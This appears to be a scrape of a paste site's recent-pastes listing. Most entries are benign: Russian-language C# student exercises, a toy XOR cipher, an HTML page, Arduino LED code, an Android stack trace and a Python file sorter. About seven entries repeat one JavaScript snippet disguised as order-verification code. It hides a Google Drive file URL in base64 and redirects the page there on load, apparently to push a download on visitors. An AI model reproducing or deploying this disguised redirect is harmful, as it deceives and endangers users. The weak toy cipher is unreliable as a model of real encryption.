    public class Program
    {
        const int BlockSize = 4;

        static void Main(string[] args)
        {
            Console.Write(""Введите текст для шифрования: "");
            string input = Console.ReadLine() ?? """";

            Console.Write(""Введите ключ (строка): "");
            string keyInput = Console.ReadLine() ?? """";

            byte[] key = GetKeyBytes(keyInput);
            byte[] plaintext = Encoding.UTF8.GetBytes(input);

            byte[] iv = GenerateRandomBlock();
            Console.WriteLine($""IV: {BitConverter.ToString(iv)}"");

            byte[] ciphertext = Encrypt(plaintext, key, iv);
            Console.WriteLine($""Зашифрованный текст (в hex): {BitConverter.ToString(ciphertext)}"");

            byte[] decrypted = Decrypt(ciphertext, key, iv);
            string decryptedText = Encoding.UTF8.GetString(decrypted).TrimEnd('\0');

            Console.WriteLine($""Расшифрованный текст: {decryptedText}"");
        }

        static byte[] GetKeyBytes(string keyInput)
        {
            byte[] keyBytes = new byte[BlockSize];
            byte[] inputBytes = Encoding.UTF8.GetBytes(keyInput);

            for (int i = 0; i < BlockSize; i++)
            {
                keyBytes[i] = i < inputBytes.Length ? inputBytes[i] : (byte)0;
            }

            return keyBytes;
        }

        static byte[] GenerateRandomBlock()
        {
            Random rand = new Random();

            byte[] block = new byte[BlockSize];
            rand.NextBytes(block);
            
            return block;
        }

        static List<byte[]> SplitIntoBlocks(byte[] data)
        {
            List<byte[]> blocks = new List<byte[]>();

            for (int i = 0; i < data.Length; i += BlockSize)
            {
                byte[] block = new byte[BlockSize];
                int remaining = Math.Min(BlockSize, data.Length - i);

                Array.Copy(data, i, block, 0, remaining);
                blocks.Add(block);
            }

            return blocks;
        }

        static byte[] Encrypt(byte[] plaintext, byte[] key, byte[] iv)
        {
            List<byte[]> plainBlocks = SplitIntoBlocks(plaintext);
            List<byte[]> cipherBlocks = new List<byte[]>();

            byte[] prevCipherBlock = iv;

            foreach (var block in plainBlocks)
            {
                byte[] xorWithPrev = XOR(block, prevCipherBlock);
                byte[] cipherBlock = XOR(xorWithPrev, key);

                cipherBlocks.Add(cipherBlock);
                prevCipherBlock = cipherBlock;
            }

            return CombineBlocks(cipherBlocks);
        }

        static byte[] Decrypt(byte[] ciphertext, byte[] key, byte[] iv)
        {
            List<byte[]> cipherBlocks = SplitIntoBlocks(ciphertext);
            List<byte[]> decryptedBlocks = new List<byte[]>();

            byte[] prevCipherBlock = iv;

            foreach (var block in cipherBlocks)
            {
                byte[] xorWithKey = XOR(block, key);
                byte[] plainBlock = XOR(xorWithKey, prevCipherBlock);

                decryptedBlocks.Add(plainBlock);
                prevCipherBlock = block;
            }

            return CombineBlocks(decryptedBlocks);
        }

        static byte[] XOR(byte[] a, byte[] b)
        {
            byte[] result = new byte[BlockSize];

            for (int i = 0; i < BlockSize; i++)
            {
                result[i] = (byte)(a[i] ^ b[i]);
            }

            return result;
        }

        static byte[] CombineBlocks(List<byte[]> blocks)
        {
            List<byte> result = new List<byte>();
            
            foreach (var block in blocks)
            {
                result.AddRange(block);
            }

            return result.ToArray();
        }
    }
}"
CVbuJe4R,Market.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 03:37:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28994/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JtUM6yMP,Task 5,vovanhik_24,C#,Tuesday 8th of April 2025 03:34:54 AM CDT,"using System;

namespace Task5
{
    public class Program
    {
        static void Main(string[] args)
        {
            ConvertTo12HourFormat(14, 30);
            ConvertTo12HourFormat(0, 45);
            ConvertTo12HourFormat(12, 0);
            ConvertTo12HourFormat(23, 59);
            ConvertTo12HourFormat(1, 5);
        }

        static void ConvertTo12HourFormat(int hours, int minutes)
        {
            if (hours < 0 || hours > 23 || minutes < 0 || minutes > 59)
            {
                Console.WriteLine(""Некорректное время."");
                return;
            }

            string period = hours < 12 ? ""AM"" : ""PM"";
            int hour12 = hours % 12;

            if (hour12 == 0)
            {
                hour12 = 12;
            }

            Console.WriteLine($""{hour12}:{minutes:D2} {period}"");
        }
    }
}"
UN4AtrRz,Task 4,vovanhik_24,C#,Tuesday 8th of April 2025 03:29:39 AM CDT,"using System;

namespace Task4
{
    public class Program
    {
        static void Main(string[] args)
        {
            int[] numbers = { 4, 1, 9, -3, 7 };

            if (numbers.Length == 0)
            {
                Console.WriteLine(""Массив пуст"");
                return;
            }

            Console.Write(""Массив: "");
            for (int i = 0; i < numbers.Length; i++)
            {
                Console.Write(numbers[i] + "", "");
            }

            int min = FindMin(numbers);
            int max = FindMax(numbers);

            Console.WriteLine($""\nМинимум: {min}\nМаксимум: {max}"");
        }

        static int FindMin(int[] arr)
        {
            int min = arr[0];

            foreach (int num in arr)
            {
                if (num < min)
                {
                    min = num;
                }
            }

            return min;
        }

        static int FindMax(int[] arr)
        {
            int max = arr[0];

            foreach (int num in arr)
            {
                if (num > max)
                {
                    max = num;
                }
            }

            return max;
        }
    }
}"
Dt4vSK0n,Untitled,Epiphemeral,JavaScript,Tuesday 8th of April 2025 03:22:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/41629/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
87tSRb0a,Task 3,vovanhik_24,C#,Tuesday 8th of April 2025 03:18:50 AM CDT,"using System;
using System.Collections.Generic;

namespace Task3
{
    public class Program
    {
        static void Main(string[] args)
        {
            int[] inputArray = { 1, 5, 8, 3, 10 };
            int threshold = 5;

            int[] filtered = FilterGreaterThan(inputArray, threshold);

            Console.WriteLine($""Элементы больше {threshold}: {string.Join("", "", filtered)}"");
        }

        public static int[] FilterGreaterThan(int[] arr, int threshold)
        {
            List<int> result = new List<int>();

            foreach (int num in arr)
            {
                if (num > threshold)
                {
                    result.Add(num);
                }
            }

            return result.ToArray();
        }
    }
}"
XqyBZqLV,Task 2,vovanhik_24,C#,Tuesday 8th of April 2025 03:14:41 AM CDT,"using System;
using System.Collections.Generic;

namespace Task2
{
    public class Program
    {
        static void Main(string[] args)
        {
            Console.Write(""Введите строку: "");
            string input = Console.ReadLine() ?? string.Empty; // защита от null

            int uniqueCount = CountUniqueChars(input);

            Console.WriteLine($""Количество уникальных символов в строке \""{input}\"": {uniqueCount}"");
        }

        public static int CountUniqueChars(string word)
        {
            if (string.IsNullOrEmpty(word))
                return 0;

            HashSet<char> uniqueChars = new HashSet<char>();

            foreach (char ch in word)
            {
                uniqueChars.Add(ch);
            }

            return uniqueChars.Count;
        }
    }
}"
5DXqv9z9,Task 1,vovanhik_24,C#,Tuesday 8th of April 2025 02:56:02 AM CDT,"using System;

namespace Task1
{
    class Program
    {
        static void Main()
        {
            Stack stack = new();

            stack.Push(10);
            stack.Push(20);
            stack.Push(30);

            stack.ShowStack();

            Console.WriteLine($""Верхний элемент: {stack.Top()}"");

            stack.Pop();
            stack.ShowStack();

            while (!stack.IsEmpty())
            {
                stack.Pop();
            }

            stack.Pop();
        }

        public class Stack
        {
            private readonly int[] _stackArray;
            private readonly int _capacity;
            private int _topIndex;

            public Stack(int size = 10)
            {
                _capacity = size;
                _stackArray = new int[_capacity];
                _topIndex = -1;
            }

            public bool IsEmpty()
            {
                return _topIndex == -1;
            }

            public void Push(int value)
            {
                if (_topIndex >= _capacity - 1)
                {
                    Console.WriteLine(""Ошибка: стек переполнен."");
                    return;
                }

                _topIndex++;
                _stackArray[_topIndex] = value;

                Console.WriteLine($""Элемент {value} добавлен в стек."");
            }

            public int Pop()
            {
                if (IsEmpty())
                {
                    Console.WriteLine(""Ошибка: стек пуст. Невозможно извлечь элемент."");
                    return 0;
                }

                int value = _stackArray[_topIndex];
                _topIndex--;

                Console.WriteLine($""Элемент {value} удалён из стека."");
                return value;
            }

            public int Top()
            {
                if (IsEmpty())
                {
                    Console.WriteLine(""Ошибка: стек пуст. Нет верхнего элемента."");
                    return 0;
                }

                return _stackArray[_topIndex];
            }

            public void ShowStack()
            {
                if (IsEmpty())
                {
                    Console.WriteLine(""Стек пуст."");
                    return;
                }

                Console.Write(""Содержимое стека: "");
                for (int i = _topIndex; i >= 0; i--)
                {
                    Console.Write($""{_stackArray[i]} "");
                }

                Console.WriteLine();
            }
        }
    }
}"
M606MUcr,Untitled,Ratqueenkslskskwkw,JavaScript,Tuesday 8th of April 2025 01:04:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/04943/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xDkG2Vy3,exer p05 plain html,qee20,HTML,Tuesday 8th of April 2025 12:54:50 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
  <meta charset=""UTF-8"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
  <title>TechBoard Inc.</title>
  <link rel=""stylesheet"" href=""style.css"">
</head>
<body>
  <header>
    <div class=""container"">
      <h1>TechBoard Inc.</h1>
      <nav>
        <ul>
          <li><a href=""#about"">About</a></li>
          <li><a href=""#products"">Products</a></li>
          <li><a href=""#contact"">Contact</a></li>
        </ul>
      </nav>
    </div>
  </header>

  <section class=""hero"">
    <div class=""container"">
      <h2>Innovating the Future of Motherboards</h2>
      <p>High-performance, reliable, and cutting-edge motherboard solutions for modern computing.</p>
    </div>
  </section>

  <section id=""about"" class=""about"">
    <div class=""container"">
      <h2>About Us</h2>
      <p>TechBoard Inc. is a leading manufacturer of high-quality motherboards, powering computers around the globe with innovation and reliability. Our mission is to deliver superior technology solutions tailored to the demands of gamers, professionals, and businesses.</p>
    </div>
  </section>

  <section id=""products"" class=""products"">
    <div class=""container"">
      <h2>Our Products</h2>
      <div class=""product-grid"">
  
        <div class=""product-card"">
          <img src=""images/tbx500.jpg"" alt=""TBX-500 Pro"">
          <h3>TBX-500 Pro</h3>
          <p>Designed for gamers, with RGB lighting and overclocking support.</p>
          <p class=""price"">$249.99</p>
        </div>
  
        <div class=""product-card"">
          <img src=""images/tbx800.jpg"" alt=""TBX-800 Ultra"">
          <h3>TBX-800 Ultra</h3>
          <p>Enterprise-class reliability for server environments.</p>
          <p class=""price"">$399.99</p>
        </div>
  
        <div class=""product-card"">
          <img src=""images/tbx300.jpg"" alt=""TBX-300 Lite"">
          <h3>TBX-300 Lite</h3>
          <p>Cost-effective and energy-efficient for everyday users.</p>
          <p class=""price"">$129.99</p>
        </div>
  
      </div>
    </div>
  </section>

  <section id=""contact"" class=""contact"">
    <div class=""container"">
      <h2>Contact Us</h2>
      <p>Email: info@techboard.com</p>
      <p>Phone: +1 800 555 1234</p>
      <p>Address: 123 Tech Valley, Silicon City, USA</p>
    </div>
  </section>

  <footer>
    <div class=""container"">
      <p>&copy; 2025 TechBoard Inc. All rights reserved.</p>
    </div>
  </footer>
</body>
</html>
"
nUmzvH5f,Products.js,kammex,JavaScript,Tuesday 8th of April 2025 12:48:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91302/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TDbPms0v,FastLED - CRGBSet,BurningWreck,C++,Tuesday 8th of April 2025 12:41:53 AM CDT,"// FastLED experiment with Gemini 2.5
// Uses 8 pixel strand with CRGBSet to control two sections
// 4/7/2025

#include <FastLED.h>

// -- Configuration --
#define NUM_LEDS 8        // Total number of LEDs in the strip
#define DATA_PIN 6        // Arduino pin connected to the Neopixel data line
#define LED_TYPE WS2812B  // Type of LED strip (WS2811, WS2812B, etc.)
#define COLOR_ORDER GRB   // Color order for the LED strip (GRB, RGB, etc.)
#define BRIGHTNESS 60     // Set initial brightness (0-255). Start low!

// -- Constants for Effects --
// Blinking Section (LEDs 0-1)
const int BLINK_INTERVAL = 3000;          // milliseconds for first two LEDs

// Effect Section (LEDs 2-7) - Slower, Longer Blinks
const uint8_t TURN_ON_CHANCE = 3;        // Chance (out of 256) per frame for an OFF LED to turn ON. LOW value = infrequent blinks.
const unsigned long MIN_ON_TIME = 800;   // Minimum time (ms) an LED stays ON
const unsigned long MAX_ON_TIME = 2500;  // Maximum time (ms) an LED stays ON

// -- Global Variables --
CRGB leds[NUM_LEDS];      // Array to hold LED color data

// State for LEDs 2-7
struct EffectLedState {
  bool isOn = false;
  unsigned long turnOffTime = 0;
  CRGB color = CRGB::Black;
};
// Create state array only for the effect LEDs (indices 2-7)
// Map physical index (2-7) to state index (0-5)
EffectLedState effectLedStates[NUM_LEDS - 2]; // Size 6 for 6 LEDs

// Timing for blinking section (LEDs 0-1)
unsigned long lastBlinkTime = 0;
bool blinkState = false;       // Current state: true = ON (Red), false = OFF (Black)

// -- Setup Function --
void setup() {
  Serial.begin(9600);
  delay(2000); // Give serial time to connect
  Serial.println(""\n\nFastLED: Slow/Long Random Blinks"");

  randomSeed(analogRead(0)); // Seed random number generator

  FastLED.addLeds<LED_TYPE, DATA_PIN, COLOR_ORDER>(leds, NUM_LEDS)
         .setCorrection(TypicalLEDStrip);
  FastLED.setBrightness(BRIGHTNESS);
  FastLED.clear(); // Initialize all LEDs to off
  FastLED.show();
  delay(50);
  Serial.println(""Setup complete. Starting loop..."");
}

// -- Main Loop --
void loop() {
  updateBlinkingSection();     // Update state for LEDs 0, 1
  updateSlowRandomBlinkSection(); // Update state for LEDs 2-7

  // Send the combined state of the 'leds' array to the strip
  FastLED.show();

  // Keep delay for overall frame rate control
  FastLED.delay(16); // Roughly 60 frames per second
}

// -- Update Functions --

// Function to handle the first two LEDs (blinking red) - UNCHANGED
void updateBlinkingSection() {
  unsigned long currentTime = millis();
  if (currentTime - lastBlinkTime >= BLINK_INTERVAL) {
    lastBlinkTime = currentTime;
    blinkState = !blinkState;
  }
  if (blinkState) {
    leds[0] = CRGB::Red;
    leds[1] = CRGB::Red;
  } else {
    leds[0] = CRGB::Black;
    leds[1] = CRGB::Black;
  }
}

// Function to handle LEDs 2-7 (slow, long random blinking colors) - NEW LOGIC
void updateSlowRandomBlinkSection() {
  unsigned long currentTime = millis();

  // Loop through effect section LEDs (indices 2 to NUM_LEDS-1)
  for (int i = 2; i < NUM_LEDS; i++) {
    int stateIndex = i - 2; // Map LED index (2-7) to state array index (0-5)

    // --- Check LED state ---
    if (effectLedStates[stateIndex].isOn) {
      // --- LED is currently ON ---
      // Check if its time to turn OFF
      if (currentTime >= effectLedStates[stateIndex].turnOffTime) {
         effectLedStates[stateIndex].isOn = false; // Update state
         leds[i] = CRGB::Black;                   // Set physical LED off
         effectLedStates[stateIndex].color = CRGB::Black; // Clear stored color
      } else {
         // Still ON - ensure the physical LED has the correct color
         // (This handles cases where it might have been accidentally turned off)
         leds[i] = effectLedStates[stateIndex].color;
      }

    } else {
      // --- LED is currently OFF ---
      // Give it a very small chance to turn ON
      if (random8() < TURN_ON_CHANCE) {
          // Calculate ON duration
          unsigned long onDuration = random(MIN_ON_TIME, MAX_ON_TIME + 1); // random() excludes upper bound

          // Update state
          effectLedStates[stateIndex].isOn = true;
          effectLedStates[stateIndex].turnOffTime = currentTime + onDuration;
          effectLedStates[stateIndex].color = CHSV(random8(), 220, 255); // New random color (slightly less saturated)

          // Set physical LED ON
          leds[i] = effectLedStates[stateIndex].color;
      }
       // else: LED remains OFF (leds[i] should be Black)
    }
  } // End loop through effect LEDs
}"
4yx42gii,Order.js,kammex,JavaScript,Tuesday 8th of April 2025 12:33:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46224/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mVyF0ckm,2025-04-08T08:19:35.760355,powerampache,PHP,Tuesday 8th of April 2025 12:19:36 AM CDT,"1.01-79 (79) - DB: 83
java.lang.NullPointerException
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$getGenres$2.invokeSuspend(MusicRepositoryImpl.kt:350)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:958)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loopOnce(Looper.java:224)
	at android.os.Looper.loop(Looper.java:318)
	at android.app.ActivityThread.main(ActivityThread.java:8790)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:561)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1013)

getGenres() - generic exception {""stackTrace"":[{""declaringClass"":""luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$getGenres$2"",""fileName"":""MusicRepositoryImpl.kt"",""lineNumber"":350,""methodName"":""invokeSuspend""},{""declaringClass"":""kotlin.coroutines.jvm.internal.BaseContinuationImpl"",""fileName"":""ContinuationImpl.kt"",""lineNumber"":33,""methodName"":""resumeWith""},{""declaringClass"":""kotlinx.coroutines.DispatchedTask"",""fileName"":""DispatchedTask.kt"",""lineNumber"":104,""methodName"":""run""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":958,""methodName"":""handleCallback""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":99,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":224,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":318,""methodName"":""loop""},{""declaringClass"":""android.app.ActivityThread"",""fileName"":""ActivityThread.java"",""lineNumber"":8790,""methodName"":""main""},{""declaringClass"":""java.lang.reflect.Method"",""fileName"":""Method.java"",""lineNumber"":-2,""methodName"":""invoke""},{""declaringClass"":""com.android.internal.os.RuntimeInit$MethodAndArgsCaller"",""fileName"":""RuntimeInit.java"",""lineNumber"":561,""methodName"":""run""},{""declaringClass"":""com.android.internal.os.ZygoteInit"",""fileName"":""ZygoteInit.java"",""lineNumber"":1013,""methodName"":""main""}]}"
sWmFdDL1,Market.js,kammex,JavaScript,Tuesday 8th of April 2025 12:17:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43908/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iXEgHDJu,Untitled,kammex,JavaScript,Tuesday 8th of April 2025 12:02:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94964/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rgNNZ5rp,Sort ext to directory py3,EmptySet5150,Python,Monday 7th of April 2025 11:53:29 PM CDT,"import os
import shutil
import argparse


def sort_files_by_extension(source_dir):
    # Get the list of files in the source directory
    files = [f for f in os.listdir(source_dir) if os.path.isfile(os.path.join(source_dir, f))]

    for file in files:
        # Get the file extension
        file_extension = file.split('.')[-1] if '.' in file else 'no_extension'

        # Create the directory for the extension if it doesn't exist
        extension_dir = os.path.join(source_dir, file_extension)
        if not os.path.exists(extension_dir):
            os.makedirs(extension_dir)

        # Move the file to the appropriate directory
        source_file = os.path.join(source_dir, file)
        destination_file = os.path.join(extension_dir, file)

        # Move the file
        shutil.move(source_file, destination_file)
        print(f'Moved: {file} to {extension_dir}')


if __name__ == ""__main__"":
    # Set up argument parsing
    parser = argparse.ArgumentParser(description=""Sort files by extension into directories."")
    parser.add_argument(""source_directory"", help=""Path to the directory containing files to sort"")

    # Parse the command-line arguments
    args = parser.parse_args()

    # Call the function with the provided source directory
    sort_files_by_extension(args.source_directory)
"
